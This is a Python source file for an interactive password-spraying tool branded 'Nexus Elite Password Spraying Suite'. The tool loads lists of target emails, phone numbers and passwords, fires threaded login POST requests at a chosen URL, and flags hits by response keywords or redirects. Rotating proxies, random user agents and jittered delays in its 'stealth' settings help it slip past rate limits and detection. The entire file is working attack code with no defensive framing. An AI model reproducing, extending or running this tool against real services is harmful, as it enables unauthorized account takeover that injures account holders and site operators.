import json
import time
import requests
import os
import sys
import random
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# ANSI Color Codes for Terminal
class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

CONFIG_FILE = "config.json"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
]

def load_config():
    with open(CONFIG_FILE, 'r') as f:
        return json.load(f)

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
{Colors.PURPLE}Nexus Elite Password Spraying Suite v8.0{Colors.END}
{Colors.DIM}--------------------------------------------------{Colors.END}
    """
    print(banner)

def main_menu():
    clear_screen()
    show_banner()
    print(f"{Colors.YELLOW}[ Main Menu ]{Colors.END}")
    print(f"{Colors.GREEN}[1]{Colors.END} Run Elite Security Scan")
    print(f"{Colors.GREEN}[2]{Colors.END} Target & Bulk Configuration")
    print(f"{Colors.GREEN}[3]{Colors.END} Server & Field Settings")
    print(f"{Colors.GREEN}[4]{Colors.END} Stealth & Proxy Settings")
    print(f"{Colors.RED}[0]{Colors.END} Exit")
    
    choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus > {Colors.END}")
    return choice

def spray_task(target, password, url, config, results):
    headers = {}
    if config['advanced_settings']['random_user_agents']:
        headers['User-Agent'] = random.choice(USER_AGENTS)
    
    proxies = None
    if config['advanced_settings']['proxy_enabled'] and config['advanced_settings']['proxies']:
        p = random.choice(config['advanced_settings']['proxies'])
        proxies = {"http": p, "https": p}
    
    try:
        # Smart Delay
        delay = random.uniform(config['advanced_settings']['smart_delay'][0], config['advanced_settings']['smart_delay'][1])
        time.sleep(delay)
        
        user_field = config['server_settings'].get('user_field', 'username')
        pass_field = config['server_settings'].get('pass_field', 'password')
        path = config['server_settings'].get('login_path', '/login')
        full_url = url.rstrip('/') + path
        
        payload = {user_field: target, pass_field: password}
        
        # Real HTTP Request with optional Proxy
        response = requests.post(full_url, data=payload, headers=headers, proxies=proxies, timeout=config['server_settings']['timeout'], allow_redirects=True)
        
        # Success Detection Logic
        success_indicators = ["logout", "success", "welcome", "dashboard", "account"]
        is_success = any(ind in response.text.lower() for ind in success_indicators) or response.status_code == 302
        
        if is_success:
            print(f"\n{Colors.GREEN}{Colors.BOLD}[SUCCESS] Found: {target} -> {password}{Colors.END}")
            results.append({"target": target, "password": password, "time": datetime.now().strftime("%H:%M:%S")})
            return True
        elif config['scan_settings']['verbose']:
            sys.stdout.write(f"{Colors.DIM}[-] Tried {target}:{password} | Status: {response.status_code}{Colors.END}\n")
            sys.stdout.flush()
    except Exception as e:
        if config['scan_settings']['verbose']:
            sys.stdout.write(f"{Colors.RED}[!] Error on {target}: {str(e)[:40]}{Colors.END}\n")
    return False

def run_high_efficiency_scan():
    config = load_config()
    clear_screen()
    show_banner()
    
    url = config['server_settings']['local_url'] if config['server_settings']['mode'] == "local" else config['server_settings']['custom_url']
    targets = config['targets']['emails'] + config['targets']['phones']
    passwords = config['passwords_to_test']
    threads = config['advanced_settings']['threads']
    
    if not targets or not passwords:
        print(f"{Colors.RED}[!] Targets or Passwords list is empty!{Colors.END}")
        time.sleep(2)
        return

    print(f"{Colors.YELLOW}Target URL: {Colors.CYAN}{url}{config['server_settings'].get('login_path', '')}{Colors.END}")
    print(f"{Colors.YELLOW}Stealth: {Colors.CYAN}{'ON' if config['advanced_settings']['proxy_enabled'] else 'OFF'}{Colors.END} | Threads: {Colors.CYAN}{threads}{Colors.END}")
    print(f"{Colors.YELLOW}Initiating Elite Spray Attack...{Colors.END}\n")

    found_results = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for pwd in passwords:
            print(f"{Colors.BLUE}{Colors.BOLD}[*] Spraying password: {pwd}{Colors.END}")
            futures = [executor.submit(spray_task, target, pwd, url, config, found_results) for target in targets]
            for f in futures: f.result()
    
    print(f"\n{Colors.YELLOW}=== Scan Summary ==={Colors.END}")
    print(f"Total Found: {Colors.GREEN}{len(found_results)}{Colors.END}")
    for res in found_results:
        print(f" - {res['target']} : {res['password']} (@{res['time']})")
    input(f"\n{Colors.BOLD}Press Enter to return...{Colors.END}")

def target_config():
    while True:
        config = load_config()
        clear_screen()
        show_banner()
        print(f"{Colors.YELLOW}[ Target & Bulk Configuration ]{Colors.END}")
        print(f"{Colors.GREEN}[1]{Colors.END} Bulk Add Usernames/Emails (Paste List)")
        print(f"{Colors.GREEN}[2]{Colors.END} Bulk Add Passwords (Paste List)")
        print(f"{Colors.GREEN}[3]{Colors.END} View Current Lists")
        print(f"{Colors.RED}[0]{Colors.END} Back")
        
        choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Targets > {Colors.END}")
        if choice == '1':
            print(f"\n{Colors.WHITE}Paste your list below (one per line, press Enter then Ctrl+D to save):{Colors.END}")
            data = sys.stdin.read().splitlines()
            config['targets']['emails'] = [x.strip() for x in data if x.strip()]
            save_config(config)
            print(f"{Colors.GREEN}[✓] Added {len(config['targets']['emails'])} targets.{Colors.END}")
            time.sleep(1)
        elif choice == '2':
            print(f"\n{Colors.WHITE}Paste your list below (one per line, press Enter then Ctrl+D to save):{Colors.END}")
            data = sys.stdin.read().splitlines()
            config['passwords_to_test'] = [x.strip() for x in data if x.strip()]
            save_config(config)
            print(f"{Colors.GREEN}[✓] Added {len(config['passwords_to_test'])} passwords.{Colors.END}")
            time.sleep(1)
        elif choice == '3':
            print(f"\nTargets: {config['targets']['emails']}")
            print(f"Passwords: {config['passwords_to_test']}")
            input("\nPress Enter...")
        elif choice == '0':
            break

def server_config():
    while True:
        config = load_config()
        clear_screen()
        show_banner()
        print(f"{Colors.YELLOW}[ Server & Field Settings ]{Colors.END}")
        print(f"1. URL: {Colors.CYAN}{config['server_settings']['custom_url'] if config['server_settings']['mode'] == 'custom' else config['server_settings']['local_url']}{Colors.END}")
        print(f"2. Path: {Colors.CYAN}{config['server_settings'].get('login_path')}{Colors.END}")
        print(f"3. User Field: {Colors.CYAN}{config['server_settings'].get('user_field')}{Colors.END}")
        print(f"4. Pass Field: {Colors.CYAN}{config['server_settings'].get('pass_field')}{Colors.END}")
        print(f"0. Back")
        
        choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Server > {Colors.END}")
        if choice == '1':
            config['server_settings']['custom_url'] = input("Base URL: ")
            config['server_settings']['mode'] = "custom"
        elif choice == '2':
            config['server_settings']['login_path'] = input("Path: ")
        elif choice == '3':
            config['server_settings']['user_field'] = input("User Field: ")
        elif choice == '4':
            config['server_settings']['pass_field'] = input("Pass Field: ")
        elif choice == '0':
            break
        save_config(config)

def stealth_config():
    while True:
        config = load_config()
        clear_screen()
        show_banner()
        print(f"{Colors.YELLOW}[ Stealth & Proxy Settings ]{Colors.END}")
        print(f"1. Proxy Enabled: {Colors.CYAN}{config['advanced_settings']['proxy_enabled']}{Colors.END}")
        print(f"2. Add Proxies (Paste List)")
        print(f"3. Random User-Agents: {Colors.CYAN}{config['advanced_settings']['random_user_agents']}{Colors.END}")
        print(f"4. Threads: {Colors.CYAN}{config['advanced_settings']['threads']}{Colors.END}")
        print(f"0. Back")
        
        choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Stealth > {Colors.END}")
        if choice == '1':
            config['advanced_settings']['proxy_enabled'] = not config['advanced_settings']['proxy_enabled']
        elif choice == '2':
            print(f"\n{Colors.WHITE}Paste proxies (e.g. 1.2.3.4:8080) (Enter then Ctrl+D):{Colors.END}")
            data = sys.stdin.read().splitlines()
            config['advanced_settings']['proxies'] = [x.strip() for x in data if x.strip()]
            print(f"{Colors.GREEN}[✓] Added {len(config['advanced_settings']['proxies'])} proxies.{Colors.END}")
            time.sleep(1)
        elif choice == '3':
            config['advanced_settings']['random_user_agents'] = not config['advanced_settings']['random_user_agents']
        elif choice == '4':
            try: config['advanced_settings']['threads'] = int(input("Threads: "))
            except: pass
        elif choice == '0':
            break
        save_config(config)

def start():
    while True:
        choice = main_menu()
        if choice == '1':
            run_high_efficiency_scan()
        elif choice == '2':
            target_config()
        elif choice == '3':
            server_config()
        elif choice == '4':
            stealth_config()
        elif choice == '0':
            sys.exit()

if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        sys.exit()
